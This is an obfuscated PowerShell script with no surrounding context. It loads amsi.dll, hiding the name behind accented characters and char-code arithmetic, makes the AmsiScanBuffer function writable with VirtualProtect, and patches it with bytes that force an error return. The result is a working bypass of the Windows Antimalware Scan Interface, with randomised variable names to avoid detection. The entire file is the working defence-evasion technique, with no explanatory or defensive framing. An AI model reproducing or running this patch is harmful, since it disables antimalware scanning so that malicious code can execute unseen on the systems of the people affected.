$caL5dkZK = @"
using System;
using System.Runtime.InteropServices;
public class caL5dkZK {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr V8YY5jEBQgv5l, string EKEuCOG);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr SfZZD, UIntPtr Fd6m0U_0v7Ut2, uint tu317GcJjVTyx9jm, out uint Zpisinzy);
}
"@

Add-Type $caL5dkZK

$opKhUl = [caL5dkZK]::LoadLibrary("$(('ám'+'sì'+'.d'+'ll').NorMaLizE([CHAr](70+32-32)+[CHAr](42+69)+[CHar](114*10/10)+[cHar]([bYTe]0x6d)+[CHAR]([Byte]0x44)) -replace [CHaR](92)+[CHAR]([Byte]0x70)+[char](123*69/69)+[cHar](77*26/26)+[cHar](110)+[CHAR]([BYTe]0x7d))")
$ApTMBQ22kUUJsdeW6 = [caL5dkZK]::GetProcAddress($opKhUl, "$([cHaR]([bYte]0x41)+[cHAR](109+48-48)+[CHar]([BYTe]0x73)+[Char]([BYte]0x69)+[cHar](8+75)+[chaR]([BYTe]0x63)+[cHar]([bYte]0x61)+[char](110+103-103)+[CHaR]([byTE]0x42)+[ChAR](117)+[chAr](102)+[CHAR]([BytE]0x66)+[ChAr]([bYtE]0x65)+[CHar](114*7/7))")
$p = 0
[caL5dkZK]::VirtualProtect($ApTMBQ22kUUJsdeW6, [uint32]5, 0x40, [ref]$p)
$i4IVh0O = "0xB8"
$HAjDMtp0pW7Sm1 = "0x57"
$kbPPIdcKnqDeMLzudV = "0x00"
$xyq2p = "0x07"
$jFbX = "0x80"
$Ladq = "0xC3"
$QgMYhC1kKMWizLg = [Byte[]] ($i4IVh0O,$HAjDMtp0pW7Sm1,$kbPPIdcKnqDeMLzudV,$xyq2p,+$jFbX,+$Ladq)
[System.Runtime.InteropServices.Marshal]::Copy($QgMYhC1kKMWizLg, 0, $ApTMBQ22kUUJsdeW6, 6)